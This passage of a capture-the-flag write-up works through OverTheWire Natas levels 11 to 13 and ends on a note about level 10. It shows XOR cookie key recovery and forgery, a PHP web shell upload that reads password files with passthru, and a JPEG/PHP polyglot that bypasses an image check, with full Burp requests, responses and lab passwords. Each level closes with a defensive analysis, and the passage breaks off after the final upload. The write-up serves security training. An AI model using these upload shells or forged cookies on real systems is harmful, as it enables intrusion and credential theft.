### Analysis
This level demonstrates an incomplete command injection mitigation, where the application attempts to filter dangerous characters but fails to fully secure the command execution.

Although characters like ;, |, and & are blocked, the application still allows user input to control the structure of the command. By injecting an additional file path (/etc/natas_webpass/natas11), it is possible to manipulate the behavior of the grep command without using restricted characters.

In this case, grep accepts multiple file arguments:
```
grep -i a file1 file2
```
This causes the command to search both files and display their contents if matches are found. Since the password file contains the letter a, its content is revealed.

This highlights that blacklist-based filtering is insufficient for preventing command injection. Attackers can often bypass such filters using alternative techniques. Proper defenses should include strict input validation, command escaping, or avoiding shell execution entirely.


---


## Natas 11
```
URL: http://natas11.natas.labs.overthewire.org
Username: natas11
Password: UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
```
After login, the webpage displayed a message `Cookies are protected with XOR encryption` and an input field labeled **“Background color:”**, along with a `Set color` button. Default input `#ffffff` and initial testing with sample value such as `#000000`is performed. The default input will remain the backgrond color of the page as white color, but the value `#000000` will change the background color to black. 

Additionally, a **View Sourcecode** link was available for further inspection. Below is the content of the source code: 
```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas11", "pass": "<censored>" };</script></head>
<?

$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);



?>

<h1>natas11</h1>
<div id="content">
<body style="background: <?=$data['bgcolor']?>;">
Cookies are protected with XOR encryption<br/><br/>

<?
if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}

?>

<form>
Background color: <input name=bgcolor value="<?=$data['bgcolor']?>">
<input type=submit value="Set color">
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```


### Finding 
By analyzing the source code, it was identified that the default data structure:
```php
$defaultdata = array("showpassword"=>"no", "bgcolor"=>"#ffffff");
```
is used to generate a cookie through the following function:
```php
function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}
```
To understand how the json_encode() output appears, a simple PHP test was conducted through php sandbox (https://onlinephp.io/):
```php
<?php
$defaultdata = array("showpassword"=>"no", "bgcolor"=>"#ffffff");
$tempdata = json_encode($defaultdata);
echo $tempdata;
?>
```
This produces the following JSON string:
```php
{"showpassword":"no","bgcolor":"#ffffff"}
```
This value serves as the plaintext in the encryption process.

Next, the plaintext is encrypted using the xor_encrypt() function with an unknown key. The result is then encoded using Base64 to produce the cookie value:
```
HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=
```
This value can be treated as the **ciphertext**.

To solve the challenge, it is necessary to recover the XOR key. The process can be summarized as follows:
1. json_encode($d) → plaintext
2. plaintext ⊕ key → intermediate value
3. Base64 encode → cookie (ciphertext)

Thus:
```
plaintext ⊕ key = Base64 decode(cookie)
```
Using XOR properties:
- plaintext ⊕ key = ciphertext
- plaintext ⊕ ciphertext = key
- ciphertext ⊕ plaintext = key

In this case, the most reliable approach is:
```
key = ciphertext ⊕ plaintext
```
This method is preferred because the plaintext is fully known and does not contain ambiguity.

Additionally, directly using the decoded cookie as a key is not practical because it may:
- contain non-printable characters
- be difficult to handle or copy accurately
- introduce encoding inconsistencies (e.g., UTF-8 vs raw bytes)

Therefore, deriving the key using known plaintext provides a more stable and accurate result.


### Approach 
The request and response were intercepted using Burp Suite for further analysis.
The request content is: 
```
GET / HTTP/1.1
Host: natas11.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Basic bmF0YXMxMTpVSmRxa0sxcFR1NlZMdDlVSFdBZ1JaejZzVlVaM2xFaw==
Connection: keep-alive
Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007; data=HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D
Upgrade-Insecure-Requests: 1
```

The response content is: 
```
HTTP/1.1 200 OK
Date: Mon, 13 Apr 2026 11:33:24 GMT
Server: Apache/2.4.58 (Ubuntu)
Set-Cookie: data=HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D
Vary: Accept-Encoding
Content-Length: 1085
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas11", "pass": "UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk" };</script></head>

<h1>natas11</h1>
<div id="content">
<body style="background: #ffffff;">
Cookies are protected with XOR encryption<br/><br/>


<form>
Background color: <input name=bgcolor value="#ffffff">
<input type=submit value="Set color">
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

The captured request contained the following cookie:
```http
Cookie: ...; data=HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D
```
The server response also confirmed that the same cookie value was being used. This indicates that the data cookie stores the encrypted user data.

#### Key Recovery Using CyberChef
To recover the XOR key, CyberChef was used with the following steps:
1. Input the cookie value: `HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=`
2. Apply Base64 Decode to obtain the raw XOR-encrypted data
3. Perform XOR using the known plaintext: `{"showpassword":"no","bgcolor":"#ffffff"}`
4. The resulting output revealed a repeating key stream: `eDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoe`
5. From this pattern, the XOR key was identified as: `eDWo`

#### Cookie Manipulation
1. After recovering the key, a modified plaintext was constructed: `{"showpassword":"yes","bgcolor":"#ffffff"}`
2. The modified data was then XOR-encrypted using the key `eDWo`
3. Base64 encoded
4. URL encoded
5. Resulting in the following cookie value: `HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5`

#### Exploitation
The original request was sent to Repeater in Burp Suite, and the data cookie was replaced with the modified value.

Below are the response obtained after modified request is sent:
```
GET / HTTP/1.1
Host: natas11.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Basic bmF0YXMxMTpVSmRxa0sxcFR1NlZMdDlVSFdBZ1JaejZzVlVaM2xFaw==
Connection: keep-alive
Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007; data=HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5
Upgrade-Insecure-Requests: 1
```

after sending the request, the following response is obtained: 
```
HTTP/1.1 200 OK
Date: Mon, 13 Apr 2026 13:04:15 GMT
Server: Apache/2.4.58 (Ubuntu)
Set-Cookie: data=HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5
Vary: Accept-Encoding
Content-Length: 1149
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8



<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas11", "pass": "UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk" };</script></head>

<h1>natas11</h1>
<div id="content">
<body style="background: #ffffff;">
Cookies are protected with XOR encryption<br/><br/>

The password for natas12 is yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB<br>
<form>
Background color: <input name=bgcolor value="#ffffff">
<input type=submit value="Set color">
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```
After resending the request, the server returned:
```
The password for natas12 is yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
```
This confirms that modifying the encrypted cookie successfully altered the application’s behavior and revealed the password.


### Analysis
This level demonstrates a **weak encryption implementation using XOR with a repeating key**. Since XOR is reversible, and part of the plaintext is known (default JSON structure), it is possible to recover the encryption key using: `key = ciphertext XOR plaintext`.

Once the key is obtained, attackers can forge arbitrary cookie values and manipulate application behavior. In this case, modifying `"showpassword"` to `"yes"` allowed the application to reveal the password for the next level. This highlights that XOR with a repeating key is not secure for protecting sensitive data. Proper cryptographic mechanisms with secure key management should be used instead.


---


## Natas 12
```
URL: http://natas12.natas.labs.overthewire.org
Username: natas12
Password: yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
```
After login, the webpage displayed a message `Choose a JPEG to upload (max 1KB):` and along with `Browse...` and `Upload File` buttons. 

Additionally, a **View Sourcecode** link was available for further inspection. Below is the content of the source code: 
```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas12", "pass": "<censored>" };</script></head>
<body>
<h1>natas12</h1>
<div id="content">
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<?php } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```


### Finding 
By analyzing the source code, it was identified that the application determines the uploaded file’s extension based on the filename parameter in the POST request:
```php
$target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
```
The extension is extracted using:
```php
$ext = pathinfo($fn, PATHINFO_EXTENSION);
```
This means the server trusts user-controlled input (filename) to decide the file extension, instead of validating the actual uploaded file content. This introduces a **file upload vulnerability**.

To test this, a PHP file was created:
```php
<?php passthru("cat /etc/natas_webpass/natas13"); ?>
```
The file was uploaded as test.php.

#### Request Content
```
POST /index.php HTTP/1.1
Host: natas12.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------39261964973491093391103850610
Content-Length: 533
Origin: http://natas12.natas.labs.overthewire.org
Authorization: Basic bmF0YXMxMjp5WmRrakFZWlJkM1I3dHE3VDVrWE1qTUpsT0lrekRlQg==
Connection: keep-alive
Referer: http://natas12.natas.labs.overthewire.org/
Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007
Upgrade-Insecure-Requests: 1

-----------------------------39261964973491093391103850610
Content-Disposition: form-data; name="MAX_FILE_SIZE"

1000
-----------------------------39261964973491093391103850610
Content-Disposition: form-data; name="filename"

m37cmsbfkf.jpg
-----------------------------39261964973491093391103850610
Content-Disposition: form-data; name="uploadedfile"; filename="test.php"
Content-Type: application/x-php

<?php passthru("cat /etc/natas_webpass/natas13"); ?>

-----------------------------39261964973491093391103850610--
```

#### Response Content 
```
HTTP/1.1 200 OK
Date: Wed, 15 Apr 2026 11:30:51 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 976
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas12", "pass": "yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB" };</script></head>
<body>
<h1>natas12</h1>
<div id="content">
The file <a href="upload/zj53xxdrgw.jpg">upload/zj53xxdrgw.jpg</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

The browser returned: `The file upload/zj53xxdrgw.jpg has been uploaded`. After clicking the link `upload/zj53xxdrgw.jpg`, it navigate to `http://natas12.natas.labs.overthewire.org/upload/zj53xxdrgw.jpg` and return the content `The image "http://natas12.natas.labs.overthewire.org/upload/zj53xxdrgw.jpg" cannot be displayed because it contains errors. This indicate that accessing the file resulted in an error because it was saved with a .jpg extension, so the PHP code was not executed.



### Approach 
To exploit this vulnerability, the filename parameter was modified in the request from: `m37cmsbfkf.jpg` to `m37cmsbfkf.php`
#### Modified Request content
```
POST /index.php HTTP/1.1
Host: natas12.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------382083169937517457761950657471
Content-Length: 539
Origin: http://natas12.natas.labs.overthewire.org
Authorization: Basic bmF0YXMxMjp5WmRrakFZWlJkM1I3dHE3VDVrWE1qTUpsT0lrekRlQg==
Connection: keep-alive
Referer: http://natas12.natas.labs.overthewire.org/
Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007
Upgrade-Insecure-Requests: 1

-----------------------------382083169937517457761950657471
Content-Disposition: form-data; name="MAX_FILE_SIZE"

1000
-----------------------------382083169937517457761950657471
Content-Disposition: form-data; name="filename"

m37cmsbfkf.php
-----------------------------382083169937517457761950657471
Content-Disposition: form-data; name="uploadedfile"; filename="test.php"
Content-Type: application/x-php

<?php passthru("cat /etc/natas_webpass/natas13"); ?>

-----------------------------382083169937517457761950657471--
```

#### Response content: 
```
HTTP/1.1 200 OK
Date: Wed, 15 Apr 2026 11:44:58 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 976
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas12", "pass": "yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB" };</script></head>
<body>
<h1>natas12</h1>
<div id="content">
The file <a href="upload/iupdauyikc.php">upload/iupdauyikc.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

At the browser, we get `The file upload/iupdauyikc.php has been uploaded`. After clikced the link, we navigate to `http://natas12.natas.labs.overthewire.org/upload/iupdauyikc.php` and the webpage returned `trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC`, which is the password for next challenge. 


### Analysis
This level demonstrates a file upload vulnerability caused by improper validation. The application relies on a user-supplied parameter (filename) to determine the file extension, rather than validating the actual file type or restricting executable content.

By modifying the file extension to .php, it was possible to upload and execute arbitrary server-side code, leading to remote code execution (RCE).

This highlights several important security issues:
- Trusting user input for file handling is dangerous
- File extensions alone are not sufficient for validation
- Uploaded files should never be executed directly

Proper defenses include:
- Validating file content (MIME type and magic bytes)
- Restricting executable file types
- Storing uploads outside the web root
- Renaming files securely on the server


---


## Natas 13
```
URL: http://natas13.natas.labs.overthewire.org
Username: natas13
Password: trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC 
```
After login, the webpage displayed a message `For security reasons, we now only accept image files! Choose a JPEG to upload (max 1KB):` and along with `Browse...` and `Upload File` buttons. 

Additionally, a **View Sourcecode** link was available for further inspection. Below is the content of the source code: 
```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas13", "pass": "<censored>" };</script></head>
<body>
<h1>natas13</h1>
<div id="content">
For security reasons, we now only accept image files!<br/><br/>

<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

    $err=$_FILES['uploadedfile']['error'];
    if($err){
        if($err === 2){
            echo "The uploaded file exceeds MAX_FILE_SIZE";
        } else{
            echo "Something went wrong :/";
        }
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<?php } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

### Finding 
Compared to the previous level, an additional validation is introduced:
```php
else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
    echo "File is not an image";
}
```
This means the application now verifies whether the uploaded file is a valid image by checking its magic bytes (file signature) instead of relying only on file extension.

Attempting to upload a PHP file directly with the following content:
```php
<?php passthru("cat /etc/natas_webpass/natas14"); ?>
```
Resulted in the error: `File is not an image`. This confirms that simple file extension bypass is no longer sufficient.

Attemtp to upoad an image file using burpsuite: 
Request Content: 
```
POST /index.php HTTP/1.1
Host: natas13.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------35342147994429824884085540906
Content-Length: 10803
Origin: http://natas13.natas.labs.overthewire.org
Authorization: Basic bmF0YXMxMzp0cmJzNXBDakNya3VTa25CQktIaGFCeHE2V20xajNMQw==
Connection: keep-alive
Referer: http://natas13.natas.labs.overthewire.org/
Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007
Upgrade-Insecure-Requests: 1

-----------------------------35342147994429824884085540906
Content-Disposition: form-data; name="MAX_FILE_SIZE"

1000
-----------------------------35342147994429824884085540906
Content-Disposition: form-data; name="filename"

f6t50p8hv5.jpg
-----------------------------35342147994429824884085540906
Content-Disposition: form-data; name="uploadedfile"; filename="picture1.jpeg"
Content-Type: image/jpeg

ÿØÿàJFIF
5&&--5-/-2/-----------------------------------------+
(content of the image files ...)
-----------------------------35342147994429824884085540906--
```

Uploading a valid JPEG file (e.g., picture1.jpeg) succeeds, provided the file size is below 1KB.

Note: If the error The uploaded file exceeds MAX_FILE_SIZE occurs, the JPEG content can be reduced by deleting some content of the image file using Burp Suite. However, the JPEG header and footer must remain intact, otherwise the file will fail validation.


The content of the response header: 
```
HTTP/1.1 200 OK
Date: Wed, 15 Apr 2026 12:14:55 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1041
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas13", "pass": "trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC" };</script></head>
<body>
<h1>natas13</h1>
<div id="content">
For security reasons, we now only accept image files!<br/><br/>

The file <a href="upload/ij0jriwn0n.jpg">upload/ij0jriwn0n.jpg</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

After the file with <1KB is successfully uploaded, the browser returned: 
```
The file upload/ij0jriwn0n.jpg has been uploaded
```

After clicking the link `upload/ij0jriwn0n.jpg`, we navigate to `http://natas13.natas.labs.overthewire.org/upload/ij0jriwn0n.jpg` and see the picture we uploaded. 


### Approach 
To bypass the exif_imagetype() check, a polyglot file was created — a file that is both a valid JPEG and contains embedded PHP code.
1. Start with a valid JPEG file (to satisfy exif_imagetype())
2. Inject PHP code inside the file content: `<?php passthru("cat /etc/natas_webpass/natas14"); ?>`
3. Ensure the JPEG header (ÿØÿàJFIF) remains intact
4. Modify the request in Burp Suite:
   - Change filename from .jpg → .php
   - Change Content-Type → application/x-php

Modified Request Content: 
```
POST /index.php HTTP/1.1
Host: natas13.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------35342147994429824884085540906
Content-Length: 1360
Origin: http://natas13.natas.labs.overthewire.org
Authorization: Basic bmF0YXMxMzp0cmJzNXBDakNya3VTa25CQktIaGFCeHE2V20xajNMQw==
Connection: keep-alive
Referer: http://natas13.natas.labs.overthewire.org/
Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007
Upgrade-Insecure-Requests: 1

-----------------------------35342147994429824884085540906
Content-Disposition: form-data; name="MAX_FILE_SIZE"

1000
-----------------------------35342147994429824884085540906
Content-Disposition: form-data; name="filename"

f6t50p8hv5.php
-----------------------------35342147994429824884085540906
Content-Disposition: form-data; name="uploadedfile"; filename="picture1.jpeg"
Content-Type: application/x-php

ÿØÿàJFIF
5&&--5-/-2/-----------------------------------------+
... (image content) ...
<?php passthru("cat /etc/natas_webpass/natas14"); ?>
... (image content) ...
-----------------------------35342147994429824884085540906--
```

Response Content: 
```
HTTP/1.1 200 OK
Date: Wed, 15 Apr 2026 12:29:14 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1041
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas13", "pass": "trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC" };</script></head>
<body>
<h1>natas13</h1>
<div id="content">
For security reasons, we now only accept image files!<br/><br/>

The file <a href="upload/xtd6xg7iv1.php">upload/xtd6xg7iv1.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

When onserved from the browser, we get the response:
```
The file upload/xtd6xg7iv1.php has been uploaded
```

